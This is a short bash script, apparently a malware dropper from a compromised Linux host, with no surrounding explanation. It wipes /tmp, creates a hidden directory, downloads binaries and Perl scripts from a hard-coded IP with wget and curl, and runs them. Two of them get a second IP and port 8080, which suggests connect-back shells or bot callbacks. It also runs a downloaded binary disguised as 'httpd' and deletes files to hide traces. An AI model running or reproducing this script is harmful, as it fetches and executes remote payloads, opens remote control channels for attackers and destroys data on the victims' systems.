 #!/bin/bash
 cd /tmp
 rm -rf *
 mkdir .temp
 cd .temp
 if [ -f cb ]; then
 /bin/chmod +x cb
 ./cb 210.245.233.251 8080 &
 else
 wget 198.170.105.69/cb
 /bin/chmod +x cb
 ./cb 210.245.233.251 8080 &
 fi
 if [ -f https ]; then
 perl https
 else
 wget 198.170.105.69/https
 curl -o https 198.170.105.69/https
 perl https
 fi
 if [ -f ping.txt ]; then
 perl ping.txt 210.245.233.251 8080 &
 else
 curl -o ping.txt http://198.170.105.69/ping.txt
 perl ping.txt 210.245.233.251 8080 &
 fi
 if [ -f httpd ]; then
 /bin/chmod +x httpd
 export PATH="."
 httpd
 else
 wget 198.170.105.69/httpd
 chmod +x httpd
 export PATH="."
 httpd
 fi
 if [ -f httpd ]; then
 /bin/chmod +x httpd
 export PATH="."
 httpd
 else
 curl -o httpd 198.170.105.69/httpd
 /bin/chmod +x httpd
 export PATH="."
 httpd
 fi
 /bin/rm -rf /tmp/su*
